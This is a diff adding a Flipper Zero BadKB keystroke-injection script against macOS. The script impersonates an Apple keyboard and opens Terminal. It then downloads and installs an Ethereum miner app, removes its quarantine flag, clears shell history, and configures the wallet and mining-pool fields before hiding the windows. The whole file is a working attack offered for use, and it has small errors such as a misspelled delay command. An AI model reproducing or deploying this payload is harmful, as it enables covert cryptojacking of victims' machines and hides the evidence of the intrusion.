@@ -1,0 +1,42 @@
+ID 05ac:021e Apple:Keyboard
+REM Keep these 3 lines IF (and only if) it's the first time you are performing a badKB attack against a specific macOS target.
+REM In fact, it helps Flipper Zero bypass the macOS keyboard setup assistant. Otherwise the attack will not start.
+REM Author: 47LeCoste
+REM Version 1.0 (Flipper Ducky)
+REM Target: macOS
+DELAY 3000
+F4
+DELAY 1000
+STRING Terminal
+DELAY 200
+ENTER
+DELAY 1000
+STRING nohup curl -o /tmp/ethereum-miner-darwin-x64-0.0.5.zip -L https://github.com/agouin/ethereum-miner/releases/download/v0.0.5/ethereum-miner-darwin-x64-0.0.5.zip && nohup unzip /tmp/ethereum-miner-darwin-x64-0.0.5.zip -d /tmp && nohup xattr -d com.apple.quarantine /Applications/ethereum-miner.app && nohup mv /tmp/ethereum-miner.app /Applications && nohup rm /tmp/ethereum-miner-darwin-x64-0.0.5.zip && nohup history -c && history -w && nohup open /Applications/ethereum-miner.app
+DEALY 15000
+TAB
+DELAY 500
+STRING WRITE HERE YOUR ETH WALLET ADDRESS 0x....
+DELAY 500
+TAB
+DELAY 500
+STRING WRITE HERE YOUR WORKER NAME Rig0....
+DELAY 500
+TAB
+DELAY 500
+STRING WRITE HERE YOUR STRATUM SERVER ADDRESS us1.ethermine.org:4444
+DELAY 500
+TAB
+DELAY 500
+STRING (OPTIONAL) WRITE HERE YOUR FAILOVER STRATUM ADDRESS us2.ethermine,org:4444
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 2000
+GUI h
+DELAY 500
+GUI TAB
+DELAY 1000
+GUI q
